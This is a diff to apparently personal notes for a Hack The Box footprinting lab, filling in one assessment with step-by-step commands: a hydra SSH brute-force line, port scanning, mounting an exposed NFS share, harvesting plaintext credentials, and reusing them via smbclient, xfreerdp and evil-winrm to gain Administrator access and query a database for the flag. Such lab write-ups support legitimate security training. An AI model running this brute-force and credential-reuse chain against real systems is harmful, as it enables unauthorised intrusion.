@@ -375,29 +375,135 @@ hydra -l simon -P mynotes.txt 10.129.38.94 ssh -v -I
 *Result:* Access to target + retrieve flag
 
 
-
 ### Assessment 2
-*Command:* 
-
-*Result:* 
-
----
-
-*Command:* 
-
-*Result:* 
+*Command:* Port scan
+- rustscan -a $TARGET -t 500 -b 1500 -- -A
+  
+*Result:* Found NFS
 
 ---
 
-*Command:* 
+*Command:* Display mounts
+- showmount -e $TARGET
 
-*Result:* 
+*Result:* /TechSupport (everyone)
+
+---
+
+*Command:* Mount share
+- mount -t nfs 10.129.202.41:/TechSupport /mnt/aufgabe2 -o nolock
+
+*Result:* A lot of text files + found credentials alex:lol123!mD
 
 ---
 
-*Command:* 
+*Command:* Access smbshare with credentials
+- smbclient //$TARGET/devshare -U alex
 
-*Result:* 
+*Result:* Found file with information sa:87N1ns@slls83 
 
 ---
+
+*Command:* Access RDP with alex user
+- xfreerdp /f /v:10.129.202.41 /u:alex /p:'lol123!mD' /workarea
+
+*Result:* No access to database, found user Administrator
+
+---
+
+*Command:* winrm with user administrator and password found in the file important.txt
+- evil-winrm -i 10.129.202.41 -u Administrator -p '87N1ns@slls83'
+- xfreerdp /f /v:10.129.202.41 /u:Administrator /p:'87N1ns@slls83' +clipboard
+
+*Result:* cmd as administrator
+
+---
+
+*Command:* Access to Database
+- Click, click, click, find table accounts, click, click, click, right click view SCHEMA.TABLES
+  
+*Result:* Found table devacc
+
+---
+
+*Command:* SELECT * FROM accounts.dbo.devsacc where name = 'HTB';
+
+*Result:* Flag
+
 ### Assessment 3
+
+*Command:*
+
+*Result:*
+
+---
+
+*Command:*
+
+*Result:*
+
+---
+
+*Command:*
+
+*Result:*
+
+---
+
+*Command:*
+
+*Result:*
+
+---
+
+*Command:*
+
+*Result:*
+
+---
+
+*Command:*
+
+*Result:*
+
+---
+
+*Command:*
+
+*Result:*
+
+---
+
+*Command:*
+
+*Result:*
+
+---
+
+*Command:*
+
+*Result:*
+
+---
+
+*Command:*
+
+*Result:*
+
+---
+
+*Command:*
+
+*Result:*
+
+---
+
+*Command:*
+
+*Result:*
+
+---
+
+*Command:*
+
+*Result:*
